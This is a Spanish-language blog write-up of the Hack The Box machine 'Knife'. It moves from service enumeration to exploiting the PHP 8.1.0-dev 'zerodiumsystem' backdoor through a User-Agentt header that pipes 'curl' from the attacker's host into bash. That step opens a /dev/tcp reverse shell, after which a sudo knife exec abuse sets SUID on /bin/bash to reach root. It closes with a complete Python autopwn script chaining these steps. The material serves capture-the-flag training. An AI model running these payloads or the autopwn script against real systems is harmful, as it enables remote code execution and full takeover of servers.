---
layout: single
title: Knife - Hack The Box
excerpt: "En esta máquina vuelve a ser muy importante la enumeración de servicios y conocer muy bien si las versiones que usan(en este caso PHP) tienen vulnerabilidades, gracias a ello conseguiremos entrar en la maquina y la escalada de privilegios será pan comido"
date: 2021-08-26
classes: wide
header:
  teaser: /assets/images/Knife/Untitled.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  -   Web
  -   PHP
  -   Exploit
  -   Scripting
  -   SUID
---

# Knife

<div>
<p style = 'text-align:center;'>
<img src="https://n3h4l.github.io/assets/img/knife-htb/logo.png" alt="" width="600px">
</p>
</div>


Script que automatiza la intrusion como root: [https://pastebin.com/zPgAEp6f](https://pastebin.com/zPgAEp6f)

# ENUMERACIÓN

Como siempre lo primero es hacer un reconocimiento de versiones y servicios de la maquina

```bash
❯ nmap -sC -sV -p22,80 10.10.10.242 -oN scanPorts
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 06:09 EDT
Nmap scan report for 10.10.10.242
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Utilizamos la herramienta `whatweb` para hacer un reconocimiento rapido de la pagina web.

## ¿Qué es `whatweb`?

WhatWeb reconoce tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados. WhatWeb tiene más de 1700 complementos, cada uno para reconocer algo diferente. WhatWeb también identifica números de versión, direcciones de correo electrónico, ID de cuenta, módulos de marco web, errores de SQL y más.

```bash
❯ whatweb http://10.10.10.242
http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

Busco informacion sobre algun exploit o vulnerabilidad sobre PHP[8.1.0-dev], y encuentro varias cosas:

```bash
❯ searchsploit php 8.1.0                                                                                                                                                                                                                   
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path                           
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                                                                                                                      | php/webapps/49933.py
```

# EXPLOTACIÓN

Lo pruebo y puedo inyectar comandos, esta version de php es vulnerable:

```bash
❯ python3 tester_exploit.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/ 
Can't acces tty; job crontol turned off.
$ whoami
james

$ ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.242  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:8661  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:8661  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:86:61  txqueuelen 1000  (Ethernet)
        RX packets 94052  bytes 5666723 (5.6 MB)
        RX errors 0  dropped 29  overruns 0  frame 0
        TX packets 94094  bytes 5274286 (5.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 31458  bytes 3331239 (3.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 31458  bytes 3331239 (3.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Vamos a examinar a bajo nivel que hace este exploit: en este [post](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/) nos explica todo acerca de la vulnerabilidad.

Vemos que a través del User-Agent podemos usar el parámetro `zerodiumsystem` para inyectar comandos en el sistema, de esta forma:

![Untitled](/assets/images/Knife/Untitled%201.png)

# GANANDO ACCESO

Vamos a ganar acceso a la maquina:

Nos creamos un archivo llamado `index.html` , nos compartimos un servidor http con python y en la petición get de `burpsuite` enviamos el siguiente User-Agent:

 `User-Agentt: zerodiumsystem("curl http://10.10.16.198|bash");`

```bash
❯ cat index.html
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.198/443 0>&1
```

![Untitled](/assets/images/Knife/Untitled%202.png)

```bash
❯python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.242 - - [26/Aug/2021 10:03:48] "GET / HTTP/1.1" 200 -

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.198] from (UNKNOWN) [10.10.10.242] 44230
bash: cannot set terminal process group (1039): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0$ whoami
whoami
james
bash-5.0$
```

Obtenemos una reverse shell como el usuario James.

# ESCALADA DE PRIVILEGIOS

```bash
james@knife:~$ $ cat user.txt
cat user.txt
70fafa7feb8aaa02687--------
james@knife:~$ $ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Enumerando el sistema, vemos que tenemos el privilegio de ejecutar como root el binario `knife` 

Este binario nos permite ejecutar comandos

```bash
** EXEC COMMANDS **
knife exec [SCRIPT] (options)
james@knife:/tmp$ $ sudo /usr/bin/knife exec --help
sudo /usr/bin/knife exec --help
knife exec [SCRIPT] (options)
    -s, --server-url URL             Chef Infra Server URL.
        --chef-zero-host HOST        Host to start Chef Infra Zero on.
        --chef-zero-port PORT        Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works.
    -k, --key KEY                    Chef Infra Server API client key.
        --[no-]color                 Use colored output, defaults to enabled.
    -c, --config CONFIG              The configuration file to use.
        --config-option OPTION=VALUE Override a single configuration option.
        --defaults                   Accept default values for all questions.
    -d, --disable-editing            Do not open EDITOR, just accept the data as is.
    -e, --editor EDITOR              Set the editor to use for interactive commands.
        --environment ENVIRONMENT    Set the Chef Infra Client environment (except for in searches, where this will be flagrantly ignored).
    -E, --exec CODE                  A string of Chef Infra Client code to execute.
        --[no-]fips                  Enable FIPS mode.
    -F, --format FORMAT              Which format to use for output. (valid options: 'summary', 'text', 'json', 'yaml', or 'pp')
        --[no-]listen                Whether a local mode (-z) server binds to a port.
    -z, --local-mode                 Point knife commands at local repository instead of Chef Infra Server.
    -u, --user USER                  Chef Infra Server API client username.
        --print-after                Show the data after a destructive operation.
        --profile PROFILE            The credentials profile to select.
    -p, --script-path PATH:PATH      A colon-separated path to look for scripts in.
    -V, --verbose                    More verbose output. Use twice (-VV) for additional verbosity and three times (-VVV) for maximum verbosity.
    -v, --version                    Show Chef Infra Client version.
    -y, --yes                        Say yes to all prompts for confirmation.
    -h, --help                       Show this help message.
```

Aprendiendo como funciona este binario en este [post](https://runebook.dev/en/docs/chef/knife_exec/index) , interpreta código en lenguaje ruby, así que podemos inyectar un comando en Ruby como el usuario root:

Una de las muchas formas de las que podemos escalar privilegios seria otorgando el privilegio SUID a la /bin/bash de tal forma que ejecutando  `bash -p` lo ejecutaríamos como el usuario root y nos otorgaría una shell como él mismo

```bash
james@knife:/$ $ sudo /usr/bin/knife exec -E 'exec "whoami"'
sudo /usr/bin/knife exec -E 'exec "whoami"'
root
james@knife:/$ $ ls -la /bin/bash
ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
james@knife:/$ $ sudo /usr/bin/knife exec -E 'exec "chmod +s /bin/bash"'
sudo /usr/bin/knife exec -E 'exec "chmod +s /bin/bash"'
james@knife:/$ $ ls -la /bin/bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
james@knife:/$ $ bash -p
bash -p
$ whoami
root
$ cat /root/root.txt
a79cadff9e6c15242493c8a-------
```

Script Autopwn para ganar acceso como root:

```python
#!/usr/bin/python3

# Title : Autopwn Knife
# Date: 26/08/21
# Exploit Author: tukutu (H4ckBl0g)
# Version PHP: 8.1.0-dev
# CVE : N/A
# References:
#     - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#     - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md
#Uso: python3 autopwn_knife.py <LHOST> <URL>
#Ejemplo: python3 autopwn_knife.py 10.10.16.198 http://10.10.10.242/

import sys
import os
import time
import threading
import requests
import signal
import subprocess
from pwn import *

if len(sys.argv) != 3:
    print("\nUso: python3 autopwn_knife.py <LHOST> <URL>\n\nEjemplo: python3 autopwn_knife.py 10.10.16.198 http://10.10.10.242/")
    sys.exit(1)

#Variables
URL = sys.argv[2]
LHOST = sys.argv[1]
LPORT = 443

#Funciones
def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def obtainShell():
    try:
        p1 = log.progress("\nCreando archivo index.html con contenido malicioso\n")
        os.system('echo "#!/bin/bash\n\nbash -i >& /dev/tcp/%s/443 0>&1" > index.html' %LHOST)
        s = requests.Session()
        cmd_header = {
            'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
            'User-Agentt' : 'zerodiumsystem("curl http://%s|bash");' %LHOST
        }
        subprocess.Popen(["timeout", "10", "python3", "-m", "http.server", "80"])
        time.sleep(1)
        r = s.get(URL, headers=cmd_header)
        time.sleep(1)
    

    except Exception as e:
        print(e)

if __name__ == '__main__':
    try:
        threading.Thread(target=obtainShell).start()
    except Exception as e:
        log.error(str(e))
    shell = listen(LPORT, timeout=5).wait_for_connection()

    if shell.sock is None:
        log.failure("No se ha obtenido conexion")
        sys.exit()
    else:
        log.success("\n ✔️  Se ha obtenido una shell ✔️ \n")
        os.system("rm index.html")
        time.sleep(1)
        shell.sendline("""sudo /usr/bin/knife exec -E 'exec "chmod +s /bin/bash"'""")
        shell.sendline("bash -p")
        shell.sendline("whoami")

    shell.interactive()
```